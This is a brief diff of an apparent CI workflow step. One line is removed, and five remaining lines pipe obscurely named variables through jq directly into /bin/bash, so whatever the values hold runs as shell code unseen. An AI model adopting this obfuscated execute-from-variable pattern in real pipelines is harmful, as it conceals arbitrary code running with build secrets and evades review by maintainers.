@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$uc4" | jq -r .obf8 | /bin/bash
           printf '%s' "$ak384" | jq -r .sjjk657 | /bin/bash
-          printf '%s' "$pf20" | jq -r .hqe53676 | /bin/bash
           echo $ylf7788 | jq -r .hbi0 | /bin/bash
           echo $w5 | jq -r .yg28801 | /bin/bash
 
